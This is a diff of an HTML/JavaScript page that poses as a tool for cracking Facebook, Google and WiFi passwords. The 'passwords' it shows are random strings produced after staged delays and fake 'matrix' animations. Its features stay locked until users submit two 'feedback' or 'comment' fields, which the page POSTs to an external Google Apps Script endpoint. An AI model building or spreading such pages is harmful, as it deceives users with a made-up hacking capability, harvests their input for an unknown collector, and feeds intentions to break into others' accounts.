@@ -1,49 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Account Search Simulation</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<title>System Simulation</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 html,body{
-  margin:0;height:100%;
-  background:#000;color:#0f0;
-  font-family:monospace;overflow:hidden;
+  margin:0;height:100%;background:#000;color:#0f0;
+  font-family:monospace;overflow:hidden
 }
+.hidden{display:none}
 .center{
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-  text-align:center;
+  display:flex;flex-direction:column;
+  justify-content:center;align-items:center;
+  height:100vh;text-align:center
 }
-
-/* ---------- LOADING ---------- */
-#loader{
-  width:160px;height:160px;
-  border:10px solid #111;
-  border-top:10px solid #0f0;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-}
-@keyframes spin{100%{transform:rotate(360deg)}}
-#percent{font-size:32px;margin-top:20px}
-
-/* ---------- UI ---------- */
-input,select,button{
-  margin:8px;padding:10px;
-  background:#111;color:#0f0;
+button,input,select{
+  background:#000;color:#0f0;
   border:2px solid #0f0;
-  font-size:16px;
+  padding:10px;margin:6px
 }
-button:hover{background:#0f0;color:#000;cursor:pointer}
-.glow{
-  text-shadow:0 0 10px #0f0,0 0 30px #0f0;
-  animation:glow 1s alternate infinite;
-}
-@keyframes glow{from{opacity:.6}to{opacity:1}}
+button:hover{background:#0f0;color:#000}
+.glow{text-shadow:0 0 15px #0f0}
+nav button{margin:4px}
+#matrix{font-size:14px;height:80px}
 </style>
 </head>
 
@@ -51,105 +31,150 @@ button:hover{background:#0f0;color:#000;cursor:pointer}
 
 <!-- INTRO -->
 <div id="intro" class="center">
-  <div id="loader"></div>
-  <div id="percent" class="glow">0%</div>
+  <div class="glow">INITIALIZING SYSTEM</div>
+  <div id="percent">0%</div>
 </div>
 
-<!-- FORM -->
-<div id="form" class="center" style="display:none">
-  <h1 class="glow">ACCOUNT SEARCH SIMULATION</h1>
-  <input placeholder="NAME" id="name">
-  <input placeholder="FRIENDS" id="friends">
-  <select id="pro"><option>PRO MODE: ON</option><option>PRO MODE: OFF</option></select>
-  <select id="lock"><option>PROFILE: LOCK</option><option>PROFILE: NO</option></select>
-  <select id="friend"><option>FRIEND: YES</option><option>FRIEND: NO</option></select>
-  <select id="bio"><option>BIO: YES</option><option>BIO: NO</option></select>
-  <select id="kind"><option>PAGE</option><option>NORMAL FACEBOOK</option></select>
-  <button id="findBtn">FIND</button>
+<!-- NAV -->
+<div id="nav" class="hidden center">
+  <nav>
+    <button onclick="openTab('main')">MAIN</button>
+    <button onclick="guard('google')">GOOGLE</button>
+    <button onclick="guard('wifi')">WIFI</button>
+    <button onclick="guard('fb')">FACEBOOK</button>
+    <button onclick="openTab('settings')">SETTINGS</button>
+  </nav>
 </div>
 
-<!-- SEARCHING -->
-<div id="searching" class="center" style="display:none">
-  <h1 class="glow">Searching Account...</h1>
+<!-- MAIN -->
+<div id="main" class="center hidden">
+  <h2 class="glow">SYSTEM READY</h2>
 </div>
 
-<!-- FOUND -->
-<div id="found" class="center" style="display:none">
-  <h1 class="glow">PASSWORD FOUND</h1>
-  <p>SUCCESSFULLY</p>
-  <button id="getPass">GET PASSWORD</button>
+<!-- GOOGLE -->
+<div id="google" class="center hidden">
+  <input id="gname" placeholder="Enter Google Name">
+  <button onclick="googleFind()">FIND</button>
+  <div id="matrix"></div>
 </div>
 
-<!-- FEEDBACK -->
-<div id="feedback" class="center" style="display:none">
-  <h2>FEEDBACK</h2>
+<div id="gresult" class="center hidden">
+  <div class="glow">ACCOUNT FOUND</div>
+  <button onclick="googlePass()">GET PASSWORD</button>
+</div>
+
+<div id="gpass" class="center hidden">
+  <h2 class="glow">PASSWORD</h2>
+  <h1 id="gpassword"></h1>
+</div>
+
+<!-- WIFI -->
+<div id="wifi" class="center hidden">
+  <input placeholder="WIFI NAME">
+  <select><option>OPEN</option><option>WPA/WPA2/WPA3</option></select>
+  <select><option>AUTO</option><option>METERED</option><option>UNMETERED</option></select>
+  <select><option>RANDOM MAC</option><option>DEVICE MAC</option></select>
+  <select><option>ON</option><option>OFF</option></select>
+</div>
+
+<!-- FACEBOOK -->
+<div id="fb" class="center hidden">
+  <input placeholder="NAME">
+  <input placeholder="FRIENDS">
+  <select><option>PRO ON</option><option>PRO OFF</option></select>
+</div>
+
+<!-- SETTINGS -->
+<div id="settings" class="center hidden">
+  <button onclick="showForm('feedback')">FEEDBACK</button>
+  <button onclick="showForm('comment')">COMMENT</button>
+</div>
+
+<div id="feedback" class="center hidden">
   <input id="f1" placeholder="Feedback 1">
   <input id="f2" placeholder="Feedback 2">
-  <button id="submitFb">SUBMIT</button>
+  <button onclick="submit('FEEDBACK')">SUBMIT</button>
 </div>
 
-<!-- PASSWORD -->
-<div id="passwordPage" class="center" style="display:none">
-  <h2>HERE PASSWORD</h2>
-  <h1 id="password" class="glow"></h1>
-  <button onclick="location.reload()">BACK TO MAIN</button>
+<div id="comment" class="center hidden">
+  <input id="c1" placeholder="Comment 1">
+  <input id="c2" placeholder="Comment 2">
+  <button onclick="submit('COMMENT')">SUBMIT</button>
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", ()=>{
+const WEB_APP_URL="https://script.google.com/macros/s/AKfycbw0H3V5S9MJJXOL3drFVfdV3SEGmPnr7lmVJYOvFjL-uoVxvQWob8dtjdTj6fy6McGj/exec";
+let registered=false;
 
-  const webAppUrl="https://script.google.com/macros/s/AKfycbwj7L4cgHlDOVPgaOpFhS9XRf98LDUwlClBOlj5-qCFYJHp-QOiGHf7VKo-xWThwRNy/exec";
+/* INTRO */
+let p=0;
+const introInt=setInterval(()=>{
+  p++;
+  percent.textContent=p+"%";
+  if(p>=100){
+    clearInterval(introInt);
+    intro.classList.add("hidden");
+    nav.classList.remove("hidden");
+    openTab('settings');
+  }
+},230);
 
-  const intro=document.getElementById("intro");
-  const form=document.getElementById("form");
-  const percent=document.getElementById("percent");
+/* NAV LOGIC */
+function openTab(id){
+  document.querySelectorAll(".center").forEach(d=>d.classList.add("hidden"));
+  nav.classList.remove("hidden");
+  document.getElementById(id).classList.remove("hidden");
+}
 
-  /* ---------- INTRO LOADING ---------- */
-  let p=0;
-  const introTimer=setInterval(()=>{
-    p++;
-    percent.textContent=p+"%";
-    if(p>=100){
-      clearInterval(introTimer);
-      intro.style.display="none";
-      form.style.display="flex";
-    }
-  },230); // 23 seconds
+function guard(id){
+  if(!registered){
+    alert("SEND FEEDBACK / COMMENT");
+    openTab('settings');
+  }else openTab(id);
+}
 
-  /* ---------- SEARCH ---------- */
-  document.getElementById("findBtn").onclick=()=>{
-    form.style.display="none";
-    searching.style.display="flex";
-    setTimeout(()=>{
-      searching.style.display="none";
-      found.style.display="flex";
-    },25000);
-  };
+/* GOOGLE FLOW */
+function googleFind(){
+  matrix.textContent="";
+  let chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let run=setInterval(()=>{
+    matrix.textContent=chars[Math.floor(Math.random()*36)].repeat(20);
+  },80);
 
-  /* ---------- FEEDBACK ---------- */
-  document.getElementById("getPass").onclick=()=>{
-    found.style.display="none";
-    feedback.style.display="flex";
-  };
+  setTimeout(()=>{
+    clearInterval(run);
+    openTab('gresult');
+  },13000);
+}
 
-  document.getElementById("submitFb").onclick=async()=>{
-    const f1=f1.value;
-    const f2=f2.value;
+function googlePass(){
+  openTab('gpass');
+  setTimeout(()=>{
+    gpassword.textContent=
+      Math.floor(100000+Math.random()*900000)
+      +String.fromCharCode(65+Math.random()*26)
+      +String.fromCharCode(65+Math.random()*26);
+  },9000);
+}
 
-    try{
-      await fetch(webAppUrl,{
-        method:"POST",
-        body:JSON.stringify({type:"feedback",input1:f1,input2:f2})
-      });
-    }catch(e){}
+/* SETTINGS */
+function showForm(id){
+  openTab(id);
+}
 
-    feedback.style.display="none";
-    password.textContent=
-      Math.floor(10000+Math.random()*90000)+"ABCDEFGHIJKLMNOPQRSTUVWXYZ"[Math.floor(Math.random()*26)];
-    passwordPage.style.display="flex";
-  };
+async function submit(type){
+  let field1 = type==="FEEDBACK"?f1.value:c1.value;
+  let field2 = type==="FEEDBACK"?f2.value:c2.value;
 
-});
+  await fetch(WEB_APP_URL,{
+    method:"POST",
+    body:JSON.stringify({type,field1,field2})
+  });
+
+  registered=true;
+  alert("REGISTERED");
+  openTab('main');
+}
 </script>
 
 </body>
